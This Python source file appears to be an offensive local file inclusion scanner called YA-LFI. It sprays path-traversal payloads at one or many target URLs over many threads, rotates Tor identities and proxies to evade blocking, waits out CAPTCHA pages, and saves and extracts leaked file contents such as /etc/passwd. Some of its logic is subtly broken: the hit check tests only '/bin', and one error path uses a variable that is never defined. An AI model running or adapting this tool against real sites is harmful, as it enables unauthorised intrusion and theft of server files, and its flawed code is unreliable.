from bs4 import BeautifulSoup
import requests
import argparse
import threading
import mmap
import os
import time
from urllib3.exceptions import NameResolutionError
from requests.exceptions import RequestException
import random
from threading import Lock
import json
import tor_manager

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

print("""

▄██   ▄      ▄████████           ▄█          ▄████████  ▄█
███   ██▄   ███    ███          ███         ███    ███ ███
███▄▄▄███   ███    ███          ███         ███    █▀  ███▌
▀▀▀▀▀▀███   ███    ███  ██████  ███        ▄███▄▄▄     ███▌
▄██   ███ ▀███████████  ██████  ███       ▀▀███▀▀▀     ███▌
███   ███   ███    ███          ███         ███        ███
███   ███   ███    ███          ███▌    ▄   ███        ███
 ▀█████▀    ███    █▀           █████▄▄██   ███        █▀


Made by: Apollyon, azuk4r
Based on: LFIScanner by R3LI4NT
""")

parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',help="Target URL",required=False)
parse.add_argument('-ulist','--url_list',help="Target multiple URLs from a file",required=False)
parse.add_argument('-wiz','--wizard',help="Run the wizard, for beginner and first time users",required=False,default=False, action="store_true")
parse.add_argument('-e','--extract',help="Extract content", action='store_true',required=False)
parse.add_argument('-p','--payload',help="Payloads file [Pre installed lists: all_os.txt , linux.txt , windows.txt]",required=False)
parse.add_argument('-t','--threads',help="Threads [5 by default]",default=5,required=False)
parse.add_argument('-pr','--proxy',help="Add a list of proxies to use [HTTP, HTTPS, SOCKS]",required=False)
parse.add_argument('-tr','--tor',help="Use Tor for connections", action='store_true',required=False)
parse.add_argument('-rotate','--tor-rotation',help="Rotate Tor IP every N requests", type=int,required=False)
parse.add_argument('-auth','--authentication',help="Load headers and/or cookies from a file to run a scan while authenticated",required=False,default="auth.json")
parse.add_argument('-save','--save_to_file',help="Save working LFI payloads by writing them to a file",required=False,default="LFI_scanner_saves.txt")
parse = parse.parse_args()

lock = Lock()

if parse.tor:
	tor_manager.start_tor_service()

def payload_counter(payload_file_path):
	with open(payload_file_path, 'rb+') as f:
		mm = mmap.mmap(f.fileno(), 0)
		lines = 0
		while mm.readline():
			lines += 1
		mm.close()
		return lines

def load_internal_payloads(payload_path):
	if os.path.isfile(payload_path):
		payloads = open(payload_path,'r')
		return payloads
	else:
		print("[X] SPECIFIED PAYLOADS NOT FOUND. PLEASE REINSTALL TOOL OR PAYLOAD FILE")
		quit()

def load_file_payloads():
	if os.path.isfile("files.txt"):
		with open("files.txt", "r") as file:
			return [line.strip() for line in file.readlines()]
	else:
		print("[X] 'files.txt' NOT FOUND")
		quit()

def replace_file_placeholder(payload, file_value):
	return payload.replace("{FILE}", file_value)

def check_single_url_with_payload(x, payloads_per_thread, payload_path, target_url, cookies, headers, save_file_path, to_extract):
	global proxies_but_dict
	global proxy_running
	payloads = load_internal_payloads(payload_path)
	file_payloads = load_file_payloads() if "{FILE}" in open(payload_path).read() else [None]

	payload_count = 0
	pointer_line = 0
	failure_count = 0
	print(f"[~] Thread {x+1} | Running on URL: {target_url} | Checking payloads...")

	if parse.tor:
		tor_manager.create_tor_instance(x+1)
		if parse.tor_rotation:
			rotation_counter = 0

	for p in payloads:
		for file_value in file_payloads:
			payload = replace_file_placeholder(p.strip(), file_value) if file_value else p.strip()
			try:
				if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread):
					if parse.tor:
						if failure_count >= 5:
							print(f"[~] Thread {x+1} | Too many failed attempts, rotating Tor IP...")
							tor_manager.rotate_tor_ip(x+1)
							failure_count = 0

						proxies = {
							'http': f'socks5://127.0.0.1:{9050 + 10 * x}',
							'https': f'socks5://127.0.0.1:{9050 + 10 * x}'
						}
						query = requests.get(target_url+payload, headers=headers, proxies=proxies, cookies=cookies)

						if parse.tor_rotation:
							rotation_counter += 1
							if rotation_counter >= parse.tor_rotation:
								try:
									tor_manager.rotate_tor_ip(x+1)
								except Exception as e:
									print(f"[!] Retry rotating Tor IP for thread {x+1} after failure: {e}")
									tor_manager.rotate_tor_ip(x+1)
								rotation_counter = 0
					elif parse.proxy:
						if proxy_running:
							query = requests.get(target_url+payload, headers=headers, proxies=random.choice(proxies_but_dict), cookies=cookies)
						else:
							query = requests.get(target_url+payload, headers=headers, cookies=cookies)
					else:
						query = requests.get(target_url+payload, headers=headers, cookies=cookies)

					if any(keyword in query.text.lower() for keyword in ["captcha", "denied", "please wait"]):
						print('[X] CAPTCHA OR BLOCK DETECTED.')
						time.sleep(10)

					payload_count += 1
					if payload_count % 25 == 0:
						print(f"[+] Thread {x+1} | Running on URL: {target_url} | Status: Checked {payload_count} payloads...")
					if "root" and "bash" and r"/bin" in query.text and query.status_code // 100 == 2:
						print("=" * 10)
						print(f"LFI DETECTED:\n URL + Payload: {target_url+payload}\n\n")
						if to_extract:
							e = BeautifulSoup(query.text, 'html5lib')
							print(e.blockquote.text)
						if save_file_path:
							lock.acquire()
							with open(save_file_path, "a") as save_file:
								save_file.write(target_url+payload + "\n")
							lock.release()
							print(f"LFI DETECTED: Saved to save file \n")
						print("=" * 10)
					failure_count = 0
				pointer_line += 1
			except RequestException:
				failure_count += 1
				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while making request")
				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Sleeping for 3 seconds then retrying payloads until error is resolved ...")
				time.sleep(3)
				if failure_count >= 50:
					print(f"[X] Thread {x+1} | Payload failed 50 times, stopping thread.")
					return
			except NameResolutionError:
				failure_count += 1
				if not last_msg_was_error:
					print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while resolving domain name. Are you sure the specified website exists and you are connected to the internet?")
					print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Sleeping for 3 seconds then retrying payloads until error is resolved ...")
					last_msg_was_error = True
					time.sleep(3)
				else:
					time.sleep(3)

def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cookies,headers,save_file_path,to_extract):
	if not target_url:
		if os.path.isfile(url_list_path):
			with open(url_list_path) as targets_file:
				for target in targets_file:
					target = target.strip()
					if target:
						if r"https://" in target or r"http://" in target:
							pass
						else:
							target = r"https://" + target
						check_single_url_with_payload(x,payloads_per_thread,payload_path,target,cookies,headers,save_file_path,to_extract)
		else:
			print("[X] NO TARGET URL SPECIFIED")
			quit()
	else:
		check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract)

def count_payloads(payload_input):
	match payload_input:
		case "all_os" | "all_os.txt" | "allos" | "allos.all_os.txt" | "1":
			print("[*] USING PAYLOADS FOR ALL OS SERVERS")
			payload_path = "all_os.txt"
			payload_count = payload_counter(payload_path)
		case "linux" | "linux.txt" | "2":
			print("[*] USING PAYLOADS FOR LINUX SERVERS")
			payload_path = "linux.txt"
			payload_count = payload_counter(payload_path)
		case "windows" | "windows.txt" | "3":
			print("[*] USING PAYLOADS FOR WINDOWS SERVERS")
			payload_path = "windows.txt"
			payload_count = payload_counter(payload_path)
		case _:
			if os.path.isfile(payload_input):
				payload_path = payload_input
				payload_count = payload_counter(payload_path)
			else:
				print("[X] SPECIFIED PAYLOAD FILE NOT FOUND")
				quit()

	return payload_count , payload_path

global proxies_but_dict
global proxy_running
proxy_running = False

def load_proxies(proxy_path):
	global proxies_but_dict
	global proxy_running

	proxy_running = True
	if os.path.isfile(proxy_path):
		with open(proxy_path , "r") as proxy_file:
			proxies = proxy_file.readlines()
		proxies = list(filter(None, proxies)) #remove emptiness
		proxies_but_dict = []
		for proxy in proxies:
			proxy = proxy.strip()
			if proxy:
				try:
					proxy_split = proxy.split(r"://")
					proxy_ip , proxy_scheme = proxy_split[1] , proxy_split[0]
					proxy_dict = {
						proxy_scheme:proxy
					}
					proxies_but_dict.append(proxy_dict)
				except:
					print(f"[!] ERROR WHILE LOADING PROXY {proxy}, USING REST OF THE PROXIES")
		if len(proxies_but_dict) == 0:
			print(f"[!] NO VALID PROXIES, RUNNING WITHOUT PROXIES")
			proxy_running = False
		else:
			print(f"[*] RUNNING USING PROXIES GIVEN")
	else:
		print("[X] PROXY FILE PATH DOES NOT EXIST")
		quit()

if parse.proxy:
	load_proxies(parse.proxy.lower())

headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
	"Accept-Language": "en-US,en;q=0.6",
	"Accept-Encoding": "gzip, deflate, br, zstd"
}
cookies = {}
#default headers

def load_authentication(auth_path , headers , cookies):
	if os.path.isfile(auth_path):
		with open(auth_path , "r") as auth_file:
			auth_data = auth_file.read()
		auth_data = json.loads(auth_data)
		#loading headers
		if auth_data["auth_headers"]:
			for header in auth_data["auth_headers"]:
				headers[header] = auth_data["auth_headers"][header]
		if auth_data["cookies"]:
			cookies = auth_data["cookies"]
	else:
		print("[X] AUTH FILE DOES NOT EXIST")

	return headers,cookies

if parse.authentication:
	headers, cookies = load_authentication(parse.authentication , headers , cookies)

if not parse.wizard:
	if parse.payload:
		payload_count , payload_path = count_payloads(parse.payload.lower())
	else:
		print("[X] NO PAYLOAD FILE SPECIFIED")
		quit()

	if parse.extract:
		to_extract = True
	else:
		to_extract = False

	if parse.save_to_file:
		save_file_path = parse.save_to_file
	else:
		save_file_path = False

	if parse.url:
		print(f"[*] RUNNING ON TARGET ---> {parse.url}")
		if r"https://" in parse.url or r"http://" in parse.url:
			current_target = parse.url
		else:
			current_target = r"https://" + parse.url

		payloads_per_thread = payload_count//int(parse.threads)

		for x in range(int(parse.threads)):
			threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract)).start()
	else:
		print(f"[*] RUNNING ON MULTIPLE TARGETS")
		url_list_path = parse.url_list.lower()
		if url_list_path:
			if os.path.isfile(url_list_path):
				payloads_per_thread = payload_count//int(parse.threads)

				for x in range(int(parse.threads)):
					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers,save_file_path,to_extract)).start()
			else:
				print("[X] GIVEN TARGET URL FILE NOT FOUND")
		else:
			print("[X] NO TARGET URL SPECIFIED")
			quit()
else:
	target_mode = input("YA-LFI Wizard | Do you want to check a [1]single URL or a [2]multiple URLs :").strip().lower()
	match target_mode:
		case "2" | "multiple":
			url_list_path = input("YA-LFI Wizard | Enter the file path from where you want to get the URLs to scan :").strip()
			if os.path.isfile(url_list_path):
				threads_count = input("YA-LFI Wizard | How many threads do you want to use :").strip()
				try:
					if threads_count:
						threads_count = int(threads_count)
					else:
						threads_count = 5
				except:
					threads_count = 5

				payload_file = input("YA-LFI Wizard | Enter the path to payload list you want to use [Builtins: [1]all_os.txt , [2]linux.txt , [3]windows.txt]:").strip().lower()

				payload_count , payload_path = count_payloads(payload_file)
				payloads_per_thread = payload_count//threads_count

				proxy_file = input("YA-LFI Wizard | Enter the path for the proxy file if you want to use them, leave blank or enter no if you dont want to use proxies").strip().lower()
				if proxy_file:
					load_proxies(proxy_file)

				auth_file = input("YA-LFI Wizard | Enter the path for auth headers and cookies if you want to use them, leave blank or enter no if you dont want to scan without auth :").strip().lower()

				if auth_file:
					headers , cookies = load_authentication(auth_file , headers , cookies)

				save_file_path = input("YA-LFI Wizard | Enter the path for file where to save results, leave blank or enter no if you dont want to scan without auth :").strip().lower()

				to_extract = input("YA-LFI Wizard | Do you want to extract the content if a working payload is found 1:(y)es / 2:(n)o :").strip().lower()

				match to_extract:
					case "1" | "y" | "yes" | "(y)es":
						to_extract = True
					case "2" | "n" | "no" | "(n)o":
						to_extract = False
					case _:
						to_extract = False

				for x in range(threads_count):
					threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,False,url_list_path,cookies,headers,save_file_path,to_extract)).start()
			else:
				print("[X] GIVEN TARGET URL FILE NOT FOUND")

		case "1" | "single":
			current_target= input("YA-LFI Wizard | Enter the URL to scan :").strip()

			print(f"[*] RUNNING ON TARGET ---> {current_target}")
			if r"https://" in current_target or r"http://" in current_target:
				current_target = current_target
			else:
				current_target = r"https://" + current_target

			threads_count = input("YA-LFI Wizard | How many threads do you want to use :").strip()
			try:
				if threads_count:
					threads_count = int(threads_count)
				else:
					threads_count = 5
			except:
				threads_count = 5

			payload_file = input("YA-LFI Wizard | Enter the path to payload list you want to use [Builtins: [1]all_os.txt , [2]linux.txt , [3]windows.txt]:").strip().lower()

			payload_count , payload_path = count_payloads(payload_file)
			payloads_per_thread = payload_count//threads_count

			proxy_file = input("YA-LFI Wizard | Enter the path for the proxy file if you want to use them, leave blank or enter no if you dont want to use proxies").strip().lower()
			if proxy_file:
				load_proxies(proxy_file)

			auth_file = input("YA-LFI Wizard | Enter the path for auth headers and cookies if you want to use them, leave blank or enter no if you dont want to scan without auth :").strip().lower()

			if auth_file:
				headers , cookies = load_authentication(auth_file , headers , cookies)

			save_file_path = input("YA-LFI Wizard | Enter the path for file where to save results, leave blank or enter no if you dont want to scan without auth :").strip().lower()

			to_extract = input("YA-LFI Wizard | Do you want to extract the content if a working payload is found 1:(y)es / 2:(n)o :").strip().lower()

			match to_extract:
				case "1" | "y" | "yes" | "(y)es":
					to_extract = True
				case "2" | "n" | "no" | "(n)o":
					to_extract = False
				case _:
					to_extract = False

			payloads_per_thread = payload_count//threads_count

			for x in range(threads_count):
				threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract)).start()

		case _:
			print("[X] NOT A VALID OPTION PLEASE RE LAUNCH THE PROGRAM AND SELECT AN AVAILABLE OPTION")
			quit()
